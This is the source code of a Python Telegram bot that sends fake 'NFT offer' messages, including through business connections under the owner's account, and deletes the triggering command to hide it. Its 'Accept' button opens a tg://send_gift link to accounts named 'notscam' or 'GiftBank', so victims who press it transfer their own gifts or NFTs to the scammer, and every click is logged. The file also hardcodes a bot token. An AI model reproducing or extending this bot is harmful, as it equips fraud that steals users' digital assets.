import html
import json
import re
import sqlite3
import threading
import time
import telebot
from telebot import types

TOKEN = "9217093222:AAGYb3Lu8L5ppSuHYehYYi4xvdFhMtGK5E0"
OWNERS = {6226038990}

DEFAULT_RATE_URL = "tg://send_gift?to=notscam"
DEFAULT_SPEC_URL = "tg://send_gift?to=GiftBank"

labels = {
    "u": ("Принять", "Отклонить", "Передать NFT"),
    "i": ("Принять", "Відхилити", "Передати NFT"),
    "n": ("Accept", "Reject", "Transfer NFT"),
    "z": ("接受", "拒绝", "转让 NFT", "如何转让？"),
    "ar": ("قبول", "رفض", "تحويل NFT", "كيف تحويل？")
}

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# База данных
conn = sqlite3.connect("bot_database.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS clicks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        action TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
""")
conn.commit()

def q(query, params=()):
    with sqlite3.connect("bot_database.db") as c:
        cur = c.cursor()
        cur.execute(query, params)
        c.commit()
        return cur.fetchall()

def delete_msg(chat_id, message_id, bc=None):
    try:
        if bc:
            for m_fn in [lambda: bot.delete_business_messages(bc, chat_id, [message_id]), lambda: bot.delete_message(chat_id, message_id)]:
                try: 
                    m_fn()
                    break
                except: 
                    pass
        else:
            try: 
                bot.delete_message(chat_id, message_id)
            except: 
                pass
    except Exception as e:
        print(f"Delete error: {e}")

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "Бот активен")

def process_ho(message, bc_id=None):
    if message.from_user and message.from_user.id not in OWNERS:
        return
    
    text = message.text or message.caption or ""
    parts = text.split()
    if len(parts) < 2:
        return
    
    link = parts[1]
    amount = parts[2] if len(parts) > 2 else "15"
    
    mode = "rate"
    if len(parts) > 3 and "unrate" in parts[3].lower():
        mode = "unrate"
            
    lang_key = "u"
    if len(parts) > 4:
        l_arg = parts[4].lower()
        if l_arg in labels:
            lang_key = l_arg
        elif l_arg == "ru":
            lang_key = "u"
        elif l_arg == "en":
            lang_key = "n"
            
    btn_texts = labels.get(lang_key, labels["u"])
    target_url = DEFAULT_SPEC_URL if mode == "unrate" else DEFAULT_RATE_URL
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(btn_texts[0], url=target_url),
        types.InlineKeyboardButton(btn_texts[1], callback_data=f"u:reject:{mode}")
    )
    
    delete_msg(message.chat.id, message.message_id, bc_id)
    
    try:
        msg_text = f"Оффер на NFT:\nСсылка: {link}\nСумма: {amount}\nРежим: {mode}"
        if bc_id:
            bot.send_message(message.chat.id, msg_text, business_connection_id=bc_id, reply_markup=markup)
        else:
            bot.send_message(message.chat.id, msg_text, reply_markup=markup)
    except Exception as e:
        print(f"Send error: {e}")

@bot.message_handler(func=lambda m: m.text and ("ho" in m.text.lower()))
def handle_ho_regular(message):
    process_ho(message, getattr(message, 'business_connection_id', None))

@bot.business_message_handler(func=lambda m: m.text and ("ho" in m.text.lower()))
def handle_ho_business(message):
    process_ho(message, getattr(message, 'business_connection_id', None))

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    data = call.data.split(":")
    if len(data) < 2:
        return
    action = data[0]
    choice = data[1]
    
    q("INSERT INTO clicks (user_id, action) VALUES (?, ?)", (call.from_user.id, f"{action}:{choice}"))
    
    try:
        bot.answer_callback_query(call.id, f"Вы выбрали: {choice}")
    except:
        pass
    
    try:
        if choice == "accept":
            bot.edit_message_text("Оффер принят ✅", call.message.chat.id, call.message.message_id)
        else:
            bot.edit_message_text("Оффер отклонен ❌", call.message.chat.id, call.message.message_id)
    except:
        pass

if __name__ == "__main__":
    print("Запуск бота...")
    try:
        bot.remove_webhook()
    except Exception as e:
        print(f"Webhook error: {e}")
        
    while True:
        try:
            bot.infinity_polling(
                skip_pending=True, 
                timeout=60, 
                long_polling_timeout=60,
                allowed_updates=["message", "edited_message", "callback_query", "business_message", "business_connection", "edited_business_message"]
            )
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
